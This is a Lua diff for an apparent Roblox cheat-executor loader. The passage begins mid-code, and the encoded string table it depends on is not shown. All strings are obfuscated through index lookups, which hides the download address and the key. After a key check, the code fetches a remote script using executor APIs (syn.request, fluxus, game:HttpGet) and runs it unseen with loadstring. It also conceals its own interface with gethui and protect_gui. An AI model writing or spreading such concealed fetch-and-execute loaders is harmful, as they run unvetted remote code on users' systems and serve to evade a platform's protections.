+ local __w={64,3,9,5,3,5,6,0,5,6,0,23,8,31,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,16,64,8,8,7,7,16,16,7,16,7,9,8,9,8,5,8,10,2,10,9,1,9,9,17,7,0,3,8,9,0,10,4,9,1,0,2,0,0,11,11,10,10,22,1,36,12,23,25}
+ local __r={}
+ local __n=0
+ for __i=1,#__w do __r[__i]=__n __n=__n+__w[__i] end
+ local __c={}
+ __tc_s=function(__k)
+  local __h=__c[__k]
+  if __h then return __h end
+  __h=__d:sub(__r[__k+1]+1,__r[__k+1]+__w[__k+1])
+  __c[__k]=__h
+  return __h
+ end
+end
+-- seed 1839610375
+
+local RAW_BASE = __tc_s(0)
+local KEY = __tc_s(1)
+local PRODUCT = __tc_s(2)
+local VERSION = __tc_s(3)
+
+local function httpGet(url)
+local request = (syn and syn.request)
+or (http and http.request)
+or (fluxus and fluxus.request)
+or http_request
+or request
+
+if request then
+local ok, res = pcall(request, { Url = url, Method = __tc_s(4) })
+if ok and type(res) == __tc_s(5) and type(res.Body) == __tc_s(6) and res.Body ~= __tc_s(7) then
+if res.StatusCode == nil or res.StatusCode == 200 then return res.Body end
+return nil, __tc_s(8) .. tostring(res.StatusCode)
+end
+end
+
+local ok, res = pcall(function() return game:HttpGet(url) end)
+if ok and type(res) == __tc_s(9) and res ~= __tc_s(10) then return res end
+
+return nil, __tc_s(11)
+end
+
+local function compile(src)
+local fn = loadstring or (getgenv and getgenv().loadstring)
+if type(fn) ~= __tc_s(12) then return nil, __tc_s(13) end
+return fn(src)
+end
+
+local LOGO_B64 =
+__tc_s(14) ..
+__tc_s(15) ..
+__tc_s(16) ..
+__tc_s(17) ..
+__tc_s(18) ..
+__tc_s(19) ..
+__tc_s(20) ..
+__tc_s(21) ..
+__tc_s(22) ..
+__tc_s(23) ..
+__tc_s(24) ..
+__tc_s(25) ..
+__tc_s(26) ..
+__tc_s(27) ..
+__tc_s(28) ..
+__tc_s(29) ..
+__tc_s(30) ..
+__tc_s(31) ..
+__tc_s(32) ..
+__tc_s(33) ..
+__tc_s(34) ..
+__tc_s(35) ..
+__tc_s(36) ..
+__tc_s(37) ..
+__tc_s(38) ..
+__tc_s(39) ..
+__tc_s(40) ..
+__tc_s(41) ..
+__tc_s(42) ..
+__tc_s(43) ..
+__tc_s(44) ..
+__tc_s(45) ..
+__tc_s(46) ..
+__tc_s(47) ..
+__tc_s(48) ..
+__tc_s(49) ..
+__tc_s(50) ..
+__tc_s(51) ..
+__tc_s(52) ..
+__tc_s(53) ..
+__tc_s(54) ..
+__tc_s(55) ..
+__tc_s(56) ..
+__tc_s(57) ..
+__tc_s(58) ..
+__tc_s(59) ..
+__tc_s(60) ..
+__tc_s(61) ..
+__tc_s(62) ..
+__tc_s(63) ..
+__tc_s(64) ..
+__tc_s(65) ..
+__tc_s(66) ..
+__tc_s(67) ..
+__tc_s(68) ..
+__tc_s(69) ..
+__tc_s(70) ..
+__tc_s(71) ..
+__tc_s(72) ..
+__tc_s(73) ..
+__tc_s(74) ..
+__tc_s(75) ..
+__tc_s(76) ..
+__tc_s(77) ..
+__tc_s(78) ..
+__tc_s(79) ..
+__tc_s(80) ..
+__tc_s(81) ..
+__tc_s(82) ..
+__tc_s(83) ..
+__tc_s(84) ..
+__tc_s(85) ..
+__tc_s(86) ..
+__tc_s(87) ..
+__tc_s(88) ..
+__tc_s(89) ..
+__tc_s(90) ..
+__tc_s(91) ..
+__tc_s(92) ..
+__tc_s(93) ..
+__tc_s(94) ..
+__tc_s(95) ..
+__tc_s(96) ..
+__tc_s(97) ..
+__tc_s(98) ..
+__tc_s(99) ..
+__tc_s(100) ..
+__tc_s(101) ..
+__tc_s(102) ..
+__tc_s(103) ..
+__tc_s(104) ..
+__tc_s(105) ..
+__tc_s(106) ..
+__tc_s(107) ..
+__tc_s(108) ..
+__tc_s(109) ..
+__tc_s(110) ..
+__tc_s(111) ..
+__tc_s(112) ..
+__tc_s(113) ..
+__tc_s(114) ..
+__tc_s(115) ..
+__tc_s(116) ..
+__tc_s(117) ..
+__tc_s(118) ..
+__tc_s(119) ..
+__tc_s(120) ..
+__tc_s(121) ..
+__tc_s(122) ..
+__tc_s(123)
+
+local function b64decode(s)
+local alphabet = __tc_s(124)
+local map, out, acc, bits = {}, {}, 0, 0
+for i = 1, #alphabet do map[alphabet:sub(i, i)] = i - 1 end
+for i = 1, #s do
+local v = map[s:sub(i, i)]
+if v then
+acc, bits = acc * 64 + v, bits + 6
+while bits >= 8 do
+bits = bits - 8
+out[#out + 1] = string.char(math.floor(acc / 2 ^ bits) % 256)
+acc = acc % 2 ^ bits
+end
+end
+end
+return table.concat(out)
+end
+
+local function loadLogo()
+if type(writefile) ~= __tc_s(125) or type(getcustomasset) ~= __tc_s(126) then return nil end
+local decode = base64decode or b64decode
+local ok = pcall(function()
+if isfolder and not isfolder(__tc_s(127)) then makefolder(__tc_s(128)) end
+writefile(__tc_s(129), decode(LOGO_B64))
+end)
+if not ok then return nil end
+local ok2, src = pcall(getcustomasset, __tc_s(130))
+return ok2 and src or nil
+end
+
+local Players = game:GetService(__tc_s(131))
+local UIS = game:GetService(__tc_s(132))
+local LP = Players.LocalPlayer
+
+local function parentGui()
+local g = (gethui and gethui()) or game:GetService(__tc_s(133))
+local ok = pcall(function() return g end)
+return ok and g or LP:WaitForChild(__tc_s(134))
+end
+
+local function make(class, props, parent)
+local o = Instance.new(class)
+for k, v in pairs(props) do o[k] = v end
+o.Parent = parent
+return o
+end
+
+local function round(o, r)
+local c = Instance.new(__tc_s(135)); c.CornerRadius = UDim.new(0, r or 6); c.Parent = o
+end
+
+local gui = make(__tc_s(136), {
+Name = __tc_s(137) .. tostring(math.random(1e6)),
+ResetOnSpawn = false, IgnoreGuiInset = true, DisplayOrder = 2147483647,
+}, parentGui())
+if syn and syn.protect_gui then pcall(syn.protect_gui, gui) end
+
+local frame = make(__tc_s(138), {
+Size = UDim2.fromOffset(360, 222),
+Position = UDim2.new(0.5, -180, 0.5, -111),
+BackgroundColor3 = Color3.fromRGB(0, 0, 0),
+BorderSizePixel = 0, Active = true,
+}, gui)
+round(frame, 10)
+make(__tc_s(139), { Color = Color3.fromRGB(200, 155, 110), Thickness = 1 }, frame)
+
+local close = make(__tc_s(140), {
+Text = __tc_s(141), Font = Enum.Font.GothamBold, TextSize = 18,
+TextColor3 = Color3.fromRGB(140, 118, 100), BackgroundTransparency = 1,
+Size = UDim2.fromOffset(28, 28), Position = UDim2.new(1, -34, 0, 8),
+}, frame)
+close.MouseButton1Click:Connect(function() gui:Destroy() end)
+
+local mark = make(__tc_s(142), {
+BackgroundTransparency = 1, ImageTransparency = 1,
+Size = UDim2.fromOffset(30, 30), Position = UDim2.new(0.5, -15, 0, 12),
+}, frame)
+local markSrc = loadLogo()
+if markSrc then
+mark.Image, mark.ImageTransparency = markSrc, 0
+else
+make(__tc_s(143), {
+Text = __tc_s(144), Font = Enum.Font.GothamBold, TextSize = 22,
+TextColor3 = Color3.fromRGB(200, 155, 110), BackgroundTransparency = 1,
+Size = UDim2.fromOffset(30, 30), Position = UDim2.new(0.5, -15, 0, 12),
+}, frame)
+end
+
+make(__tc_s(145), {
+Text = PRODUCT, Font = Enum.Font.GothamBold, TextSize = 20,
+TextColor3 = Color3.fromRGB(200, 155, 110), BackgroundTransparency = 1,
+Size = UDim2.new(1, 0, 0, 26), Position = UDim2.fromOffset(0, 44),
+}, frame)
+make(__tc_s(146), {
+Text = __tc_s(147), Font = Enum.Font.Gotham, TextSize = 12,
+TextColor3 = Color3.fromRGB(163, 139, 118), BackgroundTransparency = 1,
+Size = UDim2.new(1, 0, 0, 16), Position = UDim2.fromOffset(0, 70),
+}, frame)
+
+local box = make(__tc_s(148), {
+Text = __tc_s(149), PlaceholderText = __tc_s(150), ClearTextOnFocus = false,
+Font = Enum.Font.Gotham, TextSize = 14, TextColor3 = Color3.fromRGB(241, 231, 222),
+BackgroundColor3 = Color3.fromRGB(44, 33, 26), BorderSizePixel = 0,
+Size = UDim2.fromOffset(300, 34), Position = UDim2.fromOffset(30, 92),
+}, frame)
+round(box, 6)
+make(__tc_s(151), { Color = Color3.fromRGB(62, 46, 35), Thickness = 1 }, box)
+
+local status = make(__tc_s(152), {
+Text = __tc_s(153), Font = Enum.Font.Gotham, TextSize = 12,
+TextColor3 = Color3.fromRGB(163, 139, 118), BackgroundTransparency = 1,
+Size = UDim2.new(1, -60, 0, 16), Position = UDim2.fromOffset(30, 128),
+TextXAlignment = Enum.TextXAlignment.Left,
+}, frame)
+
+local submit = make(__tc_s(154), {
+Text = __tc_s(155), Font = Enum.Font.GothamBold, TextSize = 14,
+TextColor3 = Color3.fromRGB(0, 0, 0), BackgroundColor3 = Color3.fromRGB(200, 155, 110),
+BorderSizePixel = 0, Size = UDim2.fromOffset(300, 34), Position = UDim2.fromOffset(30, 152),
+}, frame)
+round(submit, 6)
+
+make(__tc_s(156), {
+Text = __tc_s(157) .. VERSION, Font = Enum.Font.Gotham, TextSize = 11,
+TextColor3 = Color3.fromRGB(120, 102, 88), BackgroundTransparency = 1,
+Size = UDim2.fromOffset(80, 20), Position = UDim2.new(1, -90, 1, -24),
+TextXAlignment = Enum.TextXAlignment.Right,
+}, frame)
+
+do
+local start, origin
+frame.InputBegan:Connect(function(i)
+if i.UserInputType == Enum.UserInputType.MouseButton1 then
+start = i.Position; origin = frame.Position
+end
+end)
+UIS.InputChanged:Connect(function(i)
+if start and i.UserInputType == Enum.UserInputType.MouseMovement then
+local d = i.Position - start
+frame.Position = UDim2.new(origin.X.Scale, origin.X.Offset + d.X,
+origin.Y.Scale, origin.Y.Offset + d.Y)
+end
+end)
+UIS.InputEnded:Connect(function(i)
+if i.UserInputType == Enum.UserInputType.MouseButton1 then start = nil end
+end)
+end
+
+local busy = false
+local function setStatus(text, ok)
+status.Text = text
+status.TextColor3 = ok and Color3.fromRGB(74, 222, 128)
+or (ok == false and Color3.fromRGB(255, 90, 90) or Color3.fromRGB(163, 139, 118))
+end
+
+local function launch()
+if busy then return end
+local typed = (box.Text or __tc_s(158)):lower():gsub(__tc_s(159), __tc_s(160))
+if typed == __tc_s(161) then setStatus(__tc_s(162)); return end
+if typed ~= KEY then setStatus(__tc_s(163), false); return end
+
+busy = true
+setStatus(__tc_s(164))
+
+local payload, err = httpGet(RAW_BASE .. __tc_s(165))
+if not payload then
+busy = false
+setStatus(err or __tc_s(166), false)
+return
+end
+
+if payload:sub(1, 1) == __tc_s(167) then
+busy = false
+setStatus(__tc_s(168), false)
+return
+end
+
+setStatus(__tc_s(169))
+task.wait(0.4)
+gui:Destroy()
+
+local chunk, cerr = compile(payload)
+if not chunk then
+warn(__tc_s(170) .. tostring(cerr))
+return
+end
+local ok, rerr = pcall(chunk)
+if not ok then warn(__tc_s(171) .. tostring(rerr)) end
+end
+
+submit.MouseButton1Click:Connect(launch)
+box.FocusLost:Connect(function(enter) if enter then launch() end end)
